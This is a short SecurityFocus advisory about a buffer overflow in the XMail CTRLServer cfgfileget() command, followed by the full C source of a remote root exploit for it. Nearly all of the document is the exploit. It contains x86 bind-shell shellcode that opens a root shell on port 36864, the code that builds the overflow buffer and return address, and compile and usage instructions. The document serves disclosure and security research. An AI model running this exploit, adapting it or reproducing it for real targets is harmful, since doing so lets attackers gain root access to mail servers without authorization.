source: http://www.securityfocus.com/bid/2360/info

Versions of CTRLServer are vulnerable to malicious user-supplied input. A failure to properly bounds-check data passed to the cfgfileget() command leads to an overflow, which, properly exploited, can result in remote execution of malicious code with root privilege. 

/*
 * XMail CTRLServer remote root exploit for linux/x86
 *
 * Author: isno(isno@etang.com), 01/2001
 *
 * NOTE:
 *  Because the buffer is too small to set many of NOP before shellcode,it
 * is deficult to guess ret.And it cannot brute force offset,because once 
 * sending overflow code to the CTRLServer, XMail will be crashed.
 *
 *
 * Tested on:
 *   RedHat Linux 6.0 i386 XMail 0.65
 *
 * Compile:
 *   gcc -o xmailx xmailx.c
 * 
 * Usage:
 *   ./xmailx username passwd targethost [offset]
 *   and telnet targethost 36864
 *
 */

#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>

#define BSIZE			512
#define RETADDRESS		0xbc7fe988    /* maybe 0xbffff9a4 in some box */
#define OFFSET			20
#define NOP				0x90
#define PORT			6017

void usage(char *app);

/*  shellcode bind TCP port 36864  */
char shellcode[]=
/* main: */
"\xeb\x72"                                /* jmp callz               */
/* start: */
"\x5e"                                    /* popl %esi               */
/* socket() */
"\x29\xc0"                                /* subl %eax, %eax         */
"\x89\x46\x10"                            /* movl %eax, 0x10(%esi)   */
"\x40"                                    /* incl %eax               */
"\x89\xc3"                                /* movl %eax, %ebx         */
"\x89\x46\x0c"                            /* movl %eax, 0x0c(%esi)   */
"\x40"                                    /* incl %eax               */
"\x89\x46\x08"                            /* movl %eax, 0x08(%esi)   */
"\x8d\x4e\x08"                            /* leal 0x08(%esi), %ecx   */
"\xb0\x66"                                /* movb $0x66, %al         */
"\xcd\x80"                                /* int $0x80               */
/* bind() */
"\x43"                                    /* incl %ebx               */
"\xc6\x46\x10\x10"                        /* movb $0x10, 0x10(%esi)  */
"\x66\x89\x5e\x14"                        /* movw %bx, 0x14(%esi)    */
"\x88\x46\x08"                            /* movb %al, 0x08(%esi)    */
"\x29\xc0"                                /* subl %eax, %eax         */
"\x89\xc2"                                /* movl %eax, %edx         */
"\x89\x46\x18"                            /* movl %eax, 0x18(%esi)   */
"\xb0\x90"                                /* movb $0x90, %al         */
"\x66\x89\x46\x16"                        /* movw %ax, 0x16(%esi)    */
"\x8d\x4e\x14"                            /* leal 0x14(%esi), %ecx   */
"\x89\x4e\x0c"                            /* movl %ecx, 0x0c(%esi)   */
"\x8d\x4e\x08"                            /* leal 0x08(%esi), %ecx   */
"\xb0\x66"                                /* movb $0x66, %al         */
"\xcd\x80"                                /* int $0x80               */
/* listen() */
"\x89\x5e\x0c"                            /* movl %ebx, 0x0c(%esi)   */
"\x43"                                    /* incl %ebx               */
"\x43"                                    /* incl %ebx               */
"\xb0\x66"                                /* movb $0x66, %al         */
"\xcd\x80"                                /* int $0x80               */
/* accept() */
"\x89\x56\x0c"                            /* movl %edx, 0x0c(%esi)   */
"\x89\x56\x10"                            /* movl %edx, 0x10(%esi)   */
"\xb0\x66"                                /* movb $0x66, %al         */
"\x43"                                    /* incl %ebx               */
"\xcd\x80"                                /* int $0x80               */
/* dup2(s, 0); dup2(s, 1); dup2(s, 2); */
"\x86\xc3"                                /* xchgb %al, %bl          */
"\xb0\x3f"                                /* movb $0x3f, %al         */
"\x29\xc9"                                /* subl %ecx, %ecx         */
"\xcd\x80"                                /* int $0x80               */
"\xb0\x3f"                                /* movb $0x3f, %al         */
"\x41"                                    /* incl %ecx               */
"\xcd\x80"                                /* int $0x80               */
"\xb0\x3f"                                /* movb $0x3f, %al         */
"\x41"                                    /* incl %ecx               */
"\xcd\x80"                                /* int $0x80               */
/* execve() */
"\x88\x56\x07"                            /* movb %dl, 0x07(%esi)    */
"\x89\x76\x0c"                            /* movl %esi, 0x0c(%esi)   */
"\x87\xf3"                                /* xchgl %esi, %ebx        */
"\x8d\x4b\x0c"                            /* leal 0x0c(%ebx), %ecx   */
"\xb0\x0b"                                /* movb $0x0b, %al         */
"\xcd\x80"                                /* int $0x80               */
/* callz: */
"\xe8\x89\xff\xff\xff"                    /* call start              */
"/bin/sh";
/*  128 bytes  */

int main(int argc, char *argv[])
{
	char buff[BSIZE+1];
	char sendbuf[600]="cfgfileget\t";
	char loginbuf[200];
	char rcvbuf[1024];
	char *username;
	char *password;
	char *target;
	int i;
	int noprange;
	int offset=OFFSET;
	u_long sp=RETADDRESS;
	u_long addr;

	int skt;
	long inet;
	struct hostent *host;
    struct sockaddr_in sin;

    if(argc<4)
	{
		usage(argv[0]);
		return 1;
	}
	
    username = argv[1];
    password = argv[2];
    target = argv[3];
    if(argc>4)
	{
		offset = atoi(argv[4]);
	}

	addr=sp - (long)offset;
	noprange=256+4-strlen(shellcode);
	memset(buff, NOP, BSIZE);
	memcpy(buff+(long)noprange, shellcode, strlen(shellcode));
	for (i = 256+4; i < BSIZE; i += 4)
          *((int *) &buff[i]) = addr;

	buff[BSIZE]='\0';

	fprintf(stderr, "\nUse retAddress: 0x%08x\n\n",addr);

	strcat(sendbuf, buff);
	strcat(sendbuf, "\r\n");
	strcpy(loginbuf,username);
	strcat(loginbuf,"\t");      /* command should splitted by TAB */
	strcat(loginbuf,password);
	strcat(loginbuf,"\r\n");

	skt = socket(PF_INET, SOCK_STREAM, 0);
	if(skt == 0)
    {
      perror("socket()");
      exit(-1);
    }

    inet = inet_addr(target);
	if(inet == -1)
    {
      if(host = gethostbyname(target))
	    memcpy(&inet, host->h_addr, 4);
      else
		inet = -1;
      if(inet == -1)
		{
			fprintf(stderr, "Cant resolv %s!!\n", target);
			exit (-1);
		}
    }
	sin.sin_family = PF_INET;
    sin.sin_port = htons(PORT);
    sin.sin_addr.s_addr = inet;
	if (connect (skt, (struct sockaddr *)&sin, sizeof(sin)) < 0)
    {
      perror("Connect()");
      exit(-1);
    }
	read(skt, rcvbuf, 1024);
	fprintf(stderr, "%s\n", rcvbuf);
	memset(rcvbuf, 0x0, 1024);
	fprintf(stderr, "Starting to login...\n");
	write(skt, loginbuf, strlen(loginbuf));
	sleep(1);
	read(skt, rcvbuf, 1024);
	if(strstr(rcvbuf,"00000")==NULL)
	{
		perror("Login failed!");
		exit(-1);
	}
	write(skt, sendbuf, strlen(sendbuf));
	close(skt);

	fprintf(stderr, "Success!now telnet %s 36864\n", target);
	return 1;
}

void usage(char *app)
{
  fprintf(stderr, "\nXMail 0.65/0.66 CTRLSvr exploit\n\n");
  fprintf(stderr, "Usage: %s username passwd targethost [offset]\n\n", app);
  return;
}








